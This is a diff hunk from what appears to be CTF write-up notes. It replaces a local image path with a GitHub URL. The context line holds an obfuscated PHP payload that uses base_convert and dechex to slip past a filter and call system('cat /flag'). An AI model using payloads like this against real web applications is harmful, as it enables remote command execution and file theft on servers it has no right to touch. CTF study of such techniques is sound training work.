@@ -62,4 +62,4 @@
   c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=cat /flag
   ```
 
-  ![image-20210324173412896](C:\Gitbook\Import\heart1ess_s_ctf\assets\CIS1.png)
+  ![CIS1](https://raw.githubusercontent.com/Heart-1ess/Heart_1ess-s-CTF-Note/master/assets/CIS1.png)
